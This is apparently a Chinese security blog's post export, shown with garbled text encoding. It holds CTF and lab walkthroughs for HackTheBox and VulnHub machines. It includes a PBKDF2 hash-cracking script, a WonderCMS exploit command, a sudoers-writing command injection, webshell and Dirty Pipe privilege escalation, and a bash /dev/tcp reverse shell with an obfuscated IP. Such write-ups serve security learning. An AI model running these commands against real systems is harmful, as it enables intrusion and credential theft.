ç„¶åwindowså»curlä¸‹è½½ï¼ŒæˆåŠŸè§¦å‘ã€‚\nç„¶åä¸‹è½½dbæ–‡ä»¶\nç›´æ¥æ‰“å¼€æŸ¥çœ‹\nå¯ä»¥å‘ç°å¯†ç æ˜¯ç»è¿‡å“ˆå¸Œçš„ï¼ŒåŠ å¯†æ–¹å¼æ˜¯pbkdf2ï¼Œåé¢çš„åˆ—é‡Œè¿˜æœ‰ç›å€¼\nè¿™é‡Œå¯ä»¥å†™ä¸€ä¸ªè„šæœ¬ï¼Œåœ¨ç½‘ä¸Šä¹Ÿèƒ½æ‰¾åˆ°\nimport hashlib\rimport binascii\rdef pbkdf2_hash(password, salt, iterations=50000, dklen=50):\rhash_value = hashlib.pbkdf2_hmac(\r\u0026#39;sha256\u0026#39;,\rpassword.encode(\u0026#39;utf-8\u0026#39;),\rsalt,\riterations,\rdklen\r)\rreturn hash_value\rdef find_matching_password(dictionary_file, target_hash, salt, iterations=50000, dklen=50):\rtarget_hash_bytes = binascii.unhexlify(target_hash)\rwith open(dictionary_file, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as file:\rfor line in file:\rpassword = line.strip()\rhash_value = pbkdf2_hash(password, salt, iterations, dklen)\rif hash_value == target_hash_bytes:\rprint(f\u0026#34;Found password: {password}\u0026#34;)\rreturn password\rprint(\u0026#34;Password not found.\u0026#34;)\rreturn None\rsalt = binascii.unhexlify(\u0026#39;227d873cca89103cd83a976bdac52486\u0026#39;)\rtarget_hash = \u0026#39;97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16\u0026#39;\rdictionary_file = \u0026#39;/usr/share/wordlists/rockyou.txt\u0026#39;\rfind_matching_password(dictionary_file, target_hash, salt) å› ä¸ºå½“å‰æƒé™æˆ‘ä»¬æ— æ³•ç›´æ¥è¿›å…¥Emilyçš„æ–‡ä»¶å¤¹ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥è¦ä½¿ç”¨ä¸€ä¸ªEvil-Winrm\nEvil-Winrm #\revil-winrmæ˜¯ä¸€ä¸ªå¯ç”¨äºé»‘å®¢æ”»å‡»/æ¸—é€æµ‹è¯•çš„Windowsè¿œç¨‹ç®¡ç†(WinRM) Shellã€‚\nåœ¨æ¡Œé¢å‘ç°userçš„flagï¼Œå¹¶ä¸”å‘ç°åœ¨ç”µè„‘ä¸­æœ‰Visual Studio 2019\nGoogleä¸€ä¸‹ï¼Œè®°å¾—ç”¨è‹±æ–‡\nCVE-2024-20656 #\rgit cloneä¸‹æ¥ï¼Œè·¯å¾„æ”¹ä¸ºä¸€è‡´ï¼šWh04m1001/CVE-2024-20656 (github.com)\nè¿™é‡Œ187è¡ŒCopyFileçš„ç¬¬ä¸€ä¸ªè·¯å¾„è¦ä½œä¸ºé¶æœºtmpä¸­çš„ç¬¬äºŒä¸ªshellæ¶æ„æ–‡ä»¶ã€‚è¿™ä¸ªå’Œä¹‹å‰çš„msfvenomæ˜¯ä¸€æ ·çš„ç”Ÿæˆæ–¹å¼ã€‚å±æ€§ä½¿ç”¨2019çš„å·¥å…·é›†ã€‚\nç„¶åå°†VSæ”¹ä¸ºRealaseæ¨¡å¼ç”Ÿæˆexeï¼Œå¹¶ä¸”ä¸Šä¼ åˆ°é¶æœºã€‚\nè¿˜è¦ä¸Šä¼ ä¸€ä¸ªRunaCs.exeç”¨æ¥åŠ è½½æœ¨é©¬ã€‚\nantonioCoco/RunasCsï¼š RunasCs - Csharp å’Œ Windows çš„å¼€æ”¾ç‰ˆæœ¬å†…ç½®runas.exe (github.com)\nMsfåŒæ—¶è¦è¿›è¡Œç›‘å¬ã€‚\nä¹‹åmeterpreterå°±èƒ½æ”¶åˆ°shellï¼Œå¹¶ä¸”æƒé™æ˜¯Administratorï¼Œrootçš„flagåœ¨Adminçš„æ¡Œé¢\n","date":"2024-08-31","externalUrl":null,"permalink":"/posts/2024/08/hackthebox-compiled/","section":"Posts","summary":"","title":"HTB-Compiled","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Basic Scan #\rPort \u0026amp; Dir scan #\rå‘ç°ä¸€ä¸ªcontact.phpã€‚è¿›å»çœ‹çœ‹\nå°è¯•æŠ“åŒ…çœ‹çœ‹ã€‚å¹¶æ²¡æœ‰ä»€ä¹ˆå›æ˜¾ã€‚\nå°è¯•æ‰«æä¸€ä¸‹å…¶ä»–çš„ç›®å½•ã€‚\ndirsearchæ²¡æ‰«å‡ºæ¥ï¼Œç”¨gobusteræ‰«æå‡ºäº†ä¸€ä¸ªbikeç›®å½•ã€‚\né‡è¦çš„æ˜¯è¿™ä¸ªlicense\nè¿™é‡Œæš´éœ²å‡ºäº†ä½œè€…çš„åå­—\nGithub resource #\rçœ‹æ¥ç½‘ç«™ä¼¼ä¹æ˜¯ç”¨çš„è¿™ä¸ªWonderCMSï¼Œå…¶ä¸­çš„LICENSEæ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚\nå½“å‰CMSçš„ç‰ˆæœ¬çš„3.2.0\nè€Œç»è¿‡æŸ¥æ‰¾æ¼æ´ï¼Œå‘ç°åœ¨WonderCMSçš„v3.2.0åˆ°v3.4.2ä¹‹é—´å­˜åœ¨æ¼æ´\nCVE-2023-41425 #\rPOCåœ°å€ï¼šinsomnia-jacob/CVE-2023-41425: WonderCMS RCE CVE-2023-41425 (github.com)\næ£€æŸ¥exploit.pyä¸­çš„ä»£ç ï¼Œå‘ç°è®¿é—®çš„æ˜¯è¿™ä¸ªè·¯ç”±\nè¿™ä¸ªè·¯ç”±ä¹Ÿæ˜¯å­˜åœ¨çš„ã€‚\né‚£ä¹ˆå°±å¼€å§‹æ”»å‡»ã€‚\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/CVE-2023-41425]\râ””â”€# python exploit.py -u http://sea.htb/loginURL -i 10.10.16.16 -p 4444 -r http://10.10.16.16/main.zip è®°å¾—è¦åœ¨æœ¬åœ°ç›‘å¬ç«¯å£\nå›åˆ°contact.phpï¼Œå°†expæ‰§è¡Œåä¸‹é¢å‡ºç°çš„linkç»™ä¼ ä¸Šå»ã€‚\nå³å¯åå¼¹shellï¼Œå½“å‰ç”¨æˆ·æƒé™æ˜¯æ™®é€šçš„www-dataï¼Œè¦æƒ³åŠæ³•ææƒ\nkaliä¸Šæœ‰linpeasçš„è„šæœ¬ï¼Œå¼€ä¸€ä¸ªhttpserverç„¶åé¶æœºä¸‹è½½å°±è¡Œã€‚è®°å¾—åœ¨/tmpç›®å½•ä¸‹æ‰æœ‰å†™çš„æƒé™ã€‚\næˆåŠŸæ‰§è¡Œï¼Œä¸è¿‡æœ‰ç‚¹æ…¢\nå‘ç°æœ‰è¿™å‡ ä¸ªCVEã€‚\nè¿™ä¸ªCVE-2021-3156çœ‹èµ·æ¥ä¼¼ä¹èƒ½ç”¨ã€‚\nä¸è¿‡è¿™ä¸ªå‡ ä¸ªæ¼æ´éƒ½ç”¨ä¸äº†ã€‚\nBrute Force #\råœ¨/var/www/seaç›®å½•ä¸‹é¢å‘ç°ä¸€ä¸ªdatabase.js\nå…¶ä¸­æœ‰ä¸€ä¸ªå¯†ç å­—æ®µï¼Œè¿™é‡Œä½¿ç”¨hashcatå’Œrockyouå­—å…¸æ¥ç ´è§£ï¼Œå­—ç¬¦ä¸²é‡Œçš„åæ–œæ ä¸€å®šè¦å»æ‰ï¼Œä¸ç„¶ä¼šæŠ¥é”™ã€‚ï¼ˆä»¥åŠè™šæ‹Ÿæœºå†…å­˜ä¸€å®šè¦å¼€å¤§ä¸€ç‚¹ï¼ŒåŸæ¥è™šæ‹Ÿæœº2Gçš„å†…å­˜è¿hashcatéƒ½è·‘ä¸èµ·æ¥ï¼ŒæŠŠä»–åŠ å¤§åˆ°8ä¸ªGæ‰æˆåŠŸï¼‰\nå¾—åˆ°å¯†ç æ˜¯ï¼šmychemicalromance\næŸ¥çœ‹/etc/passwdï¼Œå‘ç°æœ‰ä¸¤ä¸ªå¯ç–‘çš„ç”¨æˆ·å\nå°è¯•ç™»é™†amayï¼ŒæˆåŠŸè¿›å…¥ï¼\nPrivilege Escalation #\rä¸è¿‡amayå¹¶ä¸åœ¨è¶…çº§ç”¨æˆ·ä¸­\nä¹‹å‰linpeasçš„è¾“å‡ºä¸­å‘ç°æœ‰8080å’Œ33815è¿™ä¸¤ä¸ªç«¯å£ï¼Œä¸è¿‡å¤–éƒ¨è®¿é—®ä¸äº†ï¼Œåªèƒ½è‡ªå·±åœ¨å‘½ä»¤è¡Œé‡Œçœ‹ã€‚\næœ‰çš„ç½‘ç«™éœ€è¦ç”¨åˆ°èº«ä»½è®¤è¯ï¼Œå¯ä»¥ä½¿ç”¨-u æˆ–è€…\u0026ndash;user æ¥è¿›è¡Œä¼ å‚ï¼Œè¿™é‡Œç”¨amayçš„ç”¨æˆ·å¯†ç å¯ä»¥æ­£å¸¸è®¿é—®\nssh -v -N -L 8080:localhost:8080 amay@sea.htb\r#væ˜¯è¯¦ç»†æ¨¡å¼ï¼ŒNæ˜¯åªè½¬å‘ç«¯å£ï¼ŒLæ˜¯è½¬å‘æœ¬åœ°ç«¯å£ï¼Œè¿™é‡Œä»…åšä¸€ä¸ªç«¯å£æ˜ å°„ï¼Œä¾¿äºæœ¬åœ°è®¿é—® ç‚¹å‡»access.logä¹‹åå‡ºç°æ—¥å¿—ï¼Œè¿™é‡Œå¯ä»¥æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶åè¯»å–ä»»æ„æ–‡ä»¶ã€‚\nä¸ä»…å¦‚æ­¤ï¼Œè¿˜å¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚\nå°è¯•ç»™amayåŠ ä¸€ç‚¹æƒé™å‘¢\n/etc/passwd+\u0026amp;\u0026amp;+echo+\u0026#34;amay+ALL=(ALL)+NOPASSWD:+ALL\u0026#34;+\u0026gt;+/etc/sudoers.d/amay+#\r#ä¸€å®šè¦urlç¼–ç ä¸€ä¸‹\r/etc/passwd+%26%26+echo+\u0026#34;amay+ALL=(ALL)+NOPASSWD:+ALL\u0026#34;+\u0026gt;+/etc/sudoers.d/amay+# æˆåŠŸæ‹¿åˆ°rootæƒé™\nrootçš„flagåœ¨rootä¸‹çš„root.txtä¸­ï¼Œuserçš„flagåœ¨/home/amayç›®å½•é‡Œã€‚\nSummary #\rç¬¬ä¸€æ¬¡æ¥è§¦å›½å¤–çš„åœ¨çº¿é¶åœºï¼Œæ„Ÿè§‰è¿™ä¸ªhacktheboxè¿˜ä¸é”™ï¼Œè™½ç„¶æ˜¯è¾¹çœ‹wpè¾¹åšçš„ï¼Œä¸è¿‡æ”¶è·è¿˜æ˜¯å¾ˆå¤šã€‚\n","date":"2024-08-28","externalUrl":null,"permalink":"/posts/2024/08/hackthebox-sea/","section":"Posts","summary":"","title":"HTB-Sea","type":"posts"},{"content":"\rå‰è¨€ #\ré¶æœºæ¥è‡ªVulnerable By Design ~ VulnHub\nä¸‹è½½é“¾æ¥ï¼šhttps://download.vulnhub.com/matrix-breakout/matrix-breakout-2-morpheus.ova\nç½‘ç»œè¿æ¥æ–¹å¼é‡‡ç”¨æ¡¥æ¥ï¼ˆç›´æ¥å¤åˆ¶ç‰©ç†æœºç½‘ç»œï¼‰ï¼Œä¾¿äºæ“ä½œã€‚\næ³¨æ„ï¼ï¼ï¼ï¼ï¼\næœ¬æ–‡å†…å®¹å¹¶éç¬¦åˆé¢„æœŸï¼Œè€Œæ˜¯åˆ©ç”¨äº†å†…æ ¸æ¼æ´ã€‚å› æ­¤è¯·ä¸è¦åœ¨æ„å†…å®¹ã€‚\nå­˜æ´»ä¸»æœºæ¢æµ‹ #\rè™šæ‹Ÿæœºå¼€å¯åå¦‚å›¾æ‰€ç¤ºï¼Œéœ€è¦ç™»å½•ã€‚\n#kali\rnmap -O 192.168.101.0/24 ä½¿ç”¨nmapå¯¹å±€åŸŸç½‘å­˜æ´»ä¸»æœºè¿›è¡Œæ‰«æï¼Œå‘ç°è¯¥æœºå™¨ä¸Š80ç«¯å£æ˜¯å¼€å¯çŠ¶æ€ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡æµè§ˆå™¨è®¿é—®\næ¬¢è¿æ¥åˆ° Boot2Root CTFï¼ŒMorpheusï¼š1ã€‚\rä½ ç© Trinityï¼Œè¯•å›¾è°ƒæŸ¥ Cypher å°†å…¶ä»–äººéƒ½æ‹’ä¹‹é—¨å¤–çš„ Nebuchadnezzarï¼Œè‡³å°‘å¯¹äº ssh æ¥è¯´æ˜¯è¿™æ ·ã€‚\rç¥ä½ å¥½è¿ï¼ - @inguardians @jaybeale æ¥ä¸‹æ¥æŸ¥çœ‹81ç«¯å£ï¼Œéœ€è¦èº«ä»½è®¤è¯ã€‚\nç®€å•çš„çˆ†ç ´ä¹‹åæ— æœï¼Œå°è¯•å¯»æ‰¾å…¶ä»–çš„è§£å†³æ–¹å¼ã€‚\nç›®å½•æ‰«æ #\rç”¨å¾¡å‰‘å·¥å…·æ‰«æä¹‹åï¼Œæ‰«ä¸å‡ºä¸œè¥¿æ¥ã€‚ä¸è¿‡kaliè‡ªå¸¦çš„å­—å…¸ä¹Ÿå¯ä»¥ç”¨ã€‚\n#kali\rgobuster dir -u http://192.168.101.40 -x php,jsp,txt,asp -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt #å¦‚æœæ²¡æœ‰gobuster ï¼Œå¯ä»¥ä½¿ç”¨apt install gobuster è®¿é—®graffiti.phpï¼Œå‡ºç°å¯ä»¥äº¤äº’çš„åœ°æ–¹ã€‚\nè¿›è¡Œæ”»å‡» #\ræµ‹è¯•ä¹‹åï¼Œä»»æ„å­—ç¬¦ä¸²åœ¨æäº¤ä¹‹åä¼šä¿å­˜åœ¨å½“å‰é¡µé¢ï¼Œè€Œä¸”æ˜¯ä¸€ä¸ªå­˜å‚¨å‹çš„XSSæ¼æ´ã€‚\nå¹¶ä¸”æŠ“åŒ…ä¹‹åå¯ä»¥çœ‹åˆ°ï¼Œä¿¡æ¯å’Œå¯¼å…¥æ–‡ä»¶åéƒ½æ˜¯å¯æ§çš„ã€‚\né‚£ä¹ˆå°±å°è¯•å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œå¹¶ä¸”å¯¼å…¥åˆ°ä¸€ä¸ªphpæ–‡ä»¶ä¸­ã€‚\nç”¨èšå‰‘é“¾æ¥æˆåŠŸï¼Œå¹¶ä¸”å‘ç°ä¸€ä¸ªæç¤ºï¼Œåœ¨å½“å‰ç›®å½•ä¸‹å­˜åœ¨ä¸€ä¸ªéšè—çš„pngå›¾ç‰‡ã€‚\n#kali\rwget http://192.168.101.40/.cypher-neo.png ä¸‹è½½åˆ°kalié‡Œé¢ï¼Œå°è¯•ä½¿ç”¨binwalkæˆ–è€…foremost\n#kali\rbinwalk -e .cypher-neo.png --run-as=root æˆåŠŸåˆ†ç¦»å‡ºä¸œè¥¿ã€‚ç»è¿‡HXDæŸ¥çœ‹ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¸œè¥¿ã€‚\nè¿™é‡Œäº†è§£åˆ°ä¸€ä¸ªå¯ä»¥è¿›è¡Œææƒçš„è„šæœ¬ï¼šLinpeas\nwget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh åœ¨kaliä¸Šå¼€ç«¯å£ï¼Œç„¶ååœ¨é¶æœºä¸Šå°†å…¶ä¸‹è½½è¿‡æ¥ã€‚\nchmod +x linpeas.sh\r./linpeas.sh è¿™é‡Œæ‰§è¡Œå®Œåï¼Œå¹¶ä¸ä¼šå‡ºç°ä»»ä½•ä¸œè¥¿ã€‚wpè¯´çš„è¦åå¼¹shellä¹‹åæ‰èƒ½æ­£å¸¸æ˜¾ç¤ºã€‚\nè¿›å…¥ç½‘ç«™ï¼šåå¼¹shellå‘½ä»¤åœ¨çº¿ç”Ÿæˆå™¨|ğŸ”°é›¨è‹ğŸ”° (ddosi.org)\nå›åˆ°ä¹‹å‰é‚£ä¸ªå¯ä»¥ä¸Šä¼ æœ¨é©¬çš„åœ°æ–¹ï¼ŒæŠŠè¿™ä¸ªæœ¨é©¬ä¸Šä¼ ä¹‹åï¼Œå†è®¿é—®ã€‚åŒæ—¶kaliç«¯è¦ncç›‘å¬100ç«¯å£\nkaliæˆåŠŸè·å¾—shellã€‚\nè¿™é‡Œæšä¸¾å‡ºæ¥è®¸å¤šæ¼æ´ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯2022-0847è„ç®¡é“æ¼æ´ã€‚\nç›¸å…³é“¾æ¥ï¼šCVE-2022-0847 Linux è„ç®¡æ¼æ´åˆ†æä¸åˆ©ç”¨ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·\næ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´å®ç°ä½æƒé™ç”¨æˆ·æå‡è‡³ root æƒé™ã€‚\næŠŠpocè¿›è¡Œgit clone ä¸‹æ¥ï¼Œå†ä¼ ç»™é¶æœºæ‰§è¡Œã€‚\nchmod +x Dirty-Pipe.sh\rbash Dirty-Pipe.sh å¯ä»¥çœ‹åˆ°æƒé™å·²ç»æå‡åˆ°äº†root\nè‡³æ­¤ç»“æŸ\n","date":"2024-08-26","externalUrl":null,"permalink":"/posts/2024/08/matrix-breakout-2-morpheus/","section":"Posts","summary":"","title":"Matrix-Breakout-2-Morpheus","type":"posts"},{"content":"\rå‰è¨€ #\ré¶æœºæ¥æºï¼šVulnerable By Design ~ VulnHub\næ³¨æ„ï¼ï¼ï¼ï¼ï¼ï¼\næœ¬æ–‡å†…å®¹çº¯å±éé¢„æœŸï¼Œè¯·ä¸è¦åœ¨æ„æœ¬æ–‡å†…å®¹ã€‚\næ­£æ–‡ #\rå‘ç°æœ‰httpç«¯å£å¯ä»¥è®¿é—®ã€‚ç›´æ¥è®¿é—®æ˜¯400æŠ¥é”™ã€‚\nè¿›è¡Œæ›´è¯¦ç»†çš„æ‰«æã€‚å¯ä»¥å‘ç°ç¼–ç¨‹è¯­è¨€ç”¨çš„æ˜¯Pythonç‰ˆæœ¬ä¸º3.9ï¼ŒWebæœåŠ¡å™¨æ˜¯Apache 2.4.51\nè¿™é‡Œå¡äº†å¥½ä¹…ï¼ŒæŸ¥çœ‹wpå‘ç°æ˜¯DNSçš„é—®é¢˜ï¼Œé¶æœºåº”è¯¥æ˜¯èƒ½å¤Ÿæ­£å¸¸httpè®¿é—®çš„ï¼ˆå°¬\n#windows\rC:\\Windows\\System32\\drivers\\etc\\hosts\r#linux\r/etc/hosts\r#åœ¨æœ€ä¸‹é¢åŠ å…¥\r#earth\r192.168.101.41 earth.local\r192.168.101.41 terratest.earth.local\r#æœ€å\ripconfig /flushdns ä¹‹åæµè§ˆå™¨è®¿é—® earth.localå³å¯æ­£å¸¸è¿›å…¥\nè¿™é‡Œéšæ„è¾“å…¥æäº¤åï¼Œå‡ºç°ç±»ä¼¼äºåŠ å¯†åçš„å­—ç¬¦ä¸²ã€‚\nè¿›è¡Œç›®å½•æ‰«æï¼Œå‘ç°æœ‰ä¸€ä¸ªadminçš„è·¯ç”±å¯ä»¥è¿›å…¥ã€‚\nç„¶årobots.txtåœ¨httpsç«¯å£ä¹Ÿå¯è®¿é—®åˆ°ã€‚\næŸ¥çœ‹æœ€åä¸€ä¸ªtestingnotes.txtï¼Œå‘ç°ç•™è¨€ã€‚\næµ‹è¯•å®‰å…¨æ¶ˆæ¯ä¼ é€’ç³»ç»Ÿæ³¨æ„ï¼š\r*ä½¿ç”¨ XOR åŠ å¯†ä½œä¸ºç®—æ³•ï¼Œåœ¨ RSA ä¸­ä½¿ç”¨åº”è¯¥æ˜¯å®‰å…¨çš„ã€‚\r*åœ°çƒå·²ç¡®è®¤ä»–ä»¬å·²æ”¶åˆ°æˆ‘ä»¬å‘é€çš„æ¶ˆæ¯ã€‚\r*testdata.txt ç”¨äºæµ‹è¯•åŠ å¯†ã€‚\r*terra ç”¨ä½œ Admin Portal çš„ç”¨æˆ·åã€‚\rå¾…åŠäº‹é¡¹ï¼š\r*æˆ‘ä»¬å¦‚ä½•å®‰å…¨åœ°å°†æ¯æœˆå¯†é’¥å‘é€åˆ° Earthï¼Ÿè¿˜æ˜¯æˆ‘ä»¬åº”è¯¥æ¯å‘¨æ›´æ¢å¯†é’¥ï¼Ÿ\r*éœ€è¦æµ‹è¯•ä¸åŒçš„å¯†é’¥é•¿åº¦ä»¥é˜²æ­¢æš´åŠ›ç ´è§£ã€‚å¯†é’¥åº”è¯¥æœ‰å¤šé•¿ï¼Ÿ\r*éœ€è¦æ”¹è¿›æ¶ˆæ¯ç•Œé¢å’Œç®¡ç†é¢æ¿çš„ç•Œé¢ï¼Œç›®å‰éå¸¸åŸºç¡€ã€‚ å¤§æ¦‚ä¿¡æ¯å°±æ˜¯ï¼Œåœ¨index.htmlçš„previous messageé‚£é‡Œçš„ç®—æ³•æ˜¯å¼‚æˆ–ï¼Œç„¶åæ˜¯ç”¨testdata.txté‡Œçš„å†…å®¹è¿›è¡Œè¿ç®—çš„ï¼Œç”±äºå¼‚æˆ–è¿ç®—çš„ç‰¹æ€§ï¼Œåªéœ€è¦æŠŠå¯†æ–‡å’Œtestdata.txtå†è¿›è¡Œä¸€æ¬¡åŠ å¯†å³å¯æ¢å¤åŸæ–‡ã€‚\nimport binascii\r# å­—ç¬¦ä¸²å¼‚æˆ–\rm = \u0026#34;According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth\u0026#39;s history, life appeared in the oceans and began to affect Earth\u0026#39;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.\u0026#34;\rc = \u0026#34;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a\u0026#34;\r# å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºåå…­è¿›åˆ¶\rm = binascii.b2a_hex(m.encode(\u0026#34;utf-8\u0026#34;))\r# è¿›è¡Œå¼‚æˆ–è¿ç®—\rresult = hex(int(c, 16) ^ int(m, 16))\rprint(result)\r#0x6561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174 ä»”ç»†çœ‹ï¼Œå­—ç¬¦ä¸²æ˜¯ä¸€ç›´é‡å¤çš„ï¼šearthclimatechangebad4humans ã€‚çŒœæµ‹æ˜¯ç™»é™†å¯†ç ã€‚\nç™»å½•æˆåŠŸï¼\næµ‹è¯•å‘½ä»¤ï¼Œå½“å‰ç”¨æˆ·ä¸ºapacheï¼Œä¸æ˜¯æœ€é«˜æƒé™rootã€‚\nå…¨å±€æŸ¥æ‰¾flagï¼Œåœ¨varä¸‹å‘ç°ä¸€ä¸ª\ncat /var/earth_web/user_flag.txt\rCommand output: [user_flag_3353b67d6437f07ba7d34afd7d2fc27d] æ¥ä¸‹æ¥å°±è¦å°è¯•ææƒäº†ã€‚è¿™é‡Œè¦ä½¿ç”¨åå¼¹shellã€‚è¿™é‡Œç›´æ¥åå¼¹shellä¼šæŠ¥é”™è¯´ä¸å…è®¸è¿æ¥ã€‚\nè¿™é‡Œåªéœ€è¦æŠŠåè¿›åˆ¶æ•°æ”¹ä¸ºåå…­è¿›åˆ¶è¡¨ç¤ºå³å¯ã€‚ï¼ˆçŒœæµ‹æ˜¯é˜²ç«å¢™çš„åŸå› ï¼‰\nbash -i \u0026gt;\u0026amp; /dev/tcp/192.168.101.39/100 0\u0026gt;\u0026amp;1\ræ”¹ä¸º\rbash -i \u0026gt;\u0026amp; /dev/tcp/0xc0.0xa8.0x65.0x27/100 0\u0026gt;\u0026amp;1 æ¥ä¸‹æ¥è¿›è¡Œææƒã€‚\nåœ¨kalié‡Œå·²ç»ä¸‹è½½æœ‰äº†linpeasè„šæœ¬ï¼Œç„¶åå¼€ä¸€ä¸ªhttp.serveræœåŠ¡è®©é¶æœºä¸‹è½½ã€‚\né¶æœºä¸€å®šè¦è¿›å…¥/tmpæ‰æœ‰å†™å…¥çš„æƒé™ï¼Œç„¶åè¿è¡Œ bash linpeas.shã€‚\nå±…ç„¶åˆå‘ç°äº†è¿™ä¸ªè„ç®¡é“CVEï¼Œä¸Šä¸€ç¯‡æ–‡ç« é‡Œä¹Ÿæ˜¯è¿™ä¸ªæ¼æ´ï¼Œæ­£å¥½kalié‡Œä¸‹è½½æœ‰ã€‚\nå¯ä»¥å‘ç°æƒé™å·²ç»æåˆ°äº†root\næ‹¿åˆ°flag\n","date":"2024-08-26","externalUrl":null,"permalink":"/posts/2024/08/the-planets-earth/","section":"Posts","summary":"","title":"The Planets: Earth","type":"posts"},{"content":"","date":"2024-08-26","externalUrl":null,"permalink":"/tags/vulnhub/","section":"Tags","summary":"","title":"Vulnhub","type":"tags"},{"content":"","date":"2024-08-26","externalUrl":null,"permalink":"/categories/vulnhub/","section":"Categories","summary":"","title":"Vulnhub","type":"categories"},{"content":"","date":"2024-08-13","externalUrl":null,"permalink":"/tags/moectf/","section":"Tags","summary":"","title":"Moectf","type":"tags"},{"content":"ä¸€å¹´ä¸€åº¦çš„MoeCTFåˆæ¥äº†ï¼Œä¸è¿‡æˆ‘å¥½ä¹…æ²¡æ‰“è¿‡CTFäº†ï¼Œå‰æ®µæ—¶é—´ä¸€ç›´åœ¨æå¼€å‘ã€‚\nWEB #\rå¼—æ‹‰æ ¼ä¹‹åœ°çš„å…¥å£ #\rç›´æ¥è¿›å…¥ /robots.txt å‘ç° /webtutorEntry.phpæ–‡ä»¶ï¼Œè¿›å…¥å³å¯æ‹¿åˆ°flag\nez_http #\ræ³¨æ„GETå‚æ•°é‚£é‡ŒåŒ…å«äº†ä¸­æ–‡ï¼Œä¸€å®šè¦è¿›è¡Œurlç¼–ç ä¸€æ¬¡\nProveYourLove #\rä¿¡æ¯ï¼šéƒ½ä¸ƒå¤•äº†ï¼Œæ€ä¹ˆè¿˜æ˜¯å•èº«ç‹—ä¸«ï¼Ÿå¿«æ‹¿èµ·å‹‡æ°”å‘ä½ Â crushÂ è¡¨ç™½å­ï¼Œ300ä»½æ‰èƒ½è¯æ˜ä½ çš„çˆ±ï¼\nåœ¨ç½‘é¡µæºç ä¸­å­˜åœ¨JavaScriptæäº¤æ£€æµ‹ï¼Œæäº¤ä¹‹åä¼šåœ¨æœ¬åœ°å­˜å‚¨ç”Ÿæˆä¸€ä¸ªconfessionSubmittedï¼Œå¦‚æœå€¼ä¸ºtrueåˆ™ç‚¹å‡»æŒ‰é’®ä¹‹åè¯·æ±‚ä¼šè¢«æ‹¦æˆªåˆ°ã€‚\næœ‰ä¸¤ç§è§£å†³æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªæ¯”è¾ƒç¬¨æ‹™åŸå§‹ï¼Œå› ä¸ºä»–æ˜¯æ£€æµ‹çš„æœ¬åœ°å­˜å‚¨ï¼Œåˆ™å¯ä»¥è‡ªå·±ä¿®æ”¹\nä¸è¿‡ç”±äºè¦å‘é€ä¸‰ç™¾æ¬¡ï¼Œé‚£å°±ç”¨ç¬¬äºŒç§æ–¹æ³•ï¼Œåœ¨ç¬¬ä¸€æ¬¡è§¦å‘è¯·æ±‚çš„æ—¶å€™ç”¨burpsuiteæ‹¦æˆªï¼Œç„¶åç”¨intruderæ¨¡å—è¿›è¡Œå‘åŒ…\nå¼—æ‹‰æ ¼ä¹‹åœ°çš„æŒ‘æˆ˜ #\rç¬¬ä¸€æ­¥ï¼Œè¿›å…¥ /flag1ab.html ï¼ŒæŸ¥çœ‹ç½‘é¡µæºç \n\u0026lt;!--æ­å–œä½ æ‰¾åˆ°äº†ç½‘é¡µçš„æºä»£ç ï¼Œé€šå¸¸åœ¨è¿™é‡Œé¢˜ç›®ä¼šæ”¾ä¸€äº›æç¤ºï¼Œåšé¢˜æ²¡å¤´ç»ªä¸€å®šè¦å…ˆè¿›æ¥çœ‹ä¸€ä¸‹--\u0026gt;\r\u0026lt;!--flag1: bW9lY3Rm--\u0026gt;\r\u0026lt;!--ä¸‹ä¸€æ­¥ï¼š/flag2hh.php--\u0026gt; ç¬¬äºŒæ­¥ï¼ŒæŸ¥çœ‹æ¶ˆæ¯å¤´\nflag2: e0FmdEV\rnextpage: /flag3cad.php ç¬¬ä¸‰æ­¥ï¼ŒæŠ“åŒ…\nflag3: 